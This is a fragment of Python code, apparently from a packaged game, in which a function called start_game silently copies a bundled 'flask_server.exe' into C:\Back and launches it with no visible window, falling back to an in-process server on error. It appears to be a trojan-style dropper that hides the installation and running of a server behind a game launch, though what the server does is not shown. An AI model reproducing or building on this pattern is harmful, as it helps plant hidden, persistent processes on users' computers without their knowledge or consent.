...
def start_game():
    try:
        ...
        second_path = os.path.join(sys._MEIPASS, "flask_server.exe")
        new_dir()
        response = subprocess.run(["copy", second_path, "C:\\Back"], shell=True, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW).stdout
        response = subprocess.run([second_path], shell=True, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW).stdout
    except:
        flask_server.main()
